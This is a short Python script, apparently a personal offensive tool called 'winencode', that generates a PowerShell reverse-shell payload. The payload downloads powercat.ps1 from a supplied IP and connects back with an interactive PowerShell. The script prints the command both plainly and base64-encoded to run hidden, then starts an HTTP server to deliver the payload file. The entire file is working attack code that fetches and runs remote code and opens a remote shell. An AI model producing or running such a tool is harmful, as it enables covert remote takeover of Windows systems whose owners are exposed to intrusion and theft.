import sys
import base64
import os
import http.server
import socketserver

print(len(sys.argv))

if len(sys.argv) != 3:
    if len(sys.argv) != 4:
        print("Usage: winencode <IP> <PORT> <Server Port>")
        sys.exit(1)

IP = sys.argv[1]
PORT = sys.argv[2]

try:
    SERVER_PORT = sys.argv[3]
except:
    SERVER_PORT = 8000

print('[+] Payload')
payload = f"IEX(New-Object System.Net.WebClient).DownloadString('http://{IP}:{SERVER_PORT}/powercat.ps1');powercat -c {IP} -p {PORT} -e powershell"
print(f'powershell -nop -w hidden -c {payload}')
print('')

print('[+] Encoded Payload')
encoded_payload = base64.b64encode(payload.encode('utf16')[2:]).decode()
print(f'powershell -nop -w hidden -e {encoded_payload}')
print()

print(f'[+] Running HTTP Server Port {SERVER_PORT}')
os.chdir('/home/pineapplelogic/Documents/Scripts/Windows/')

Handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", int(SERVER_PORT)), Handler) as httpd:
    httpd.serve_forever()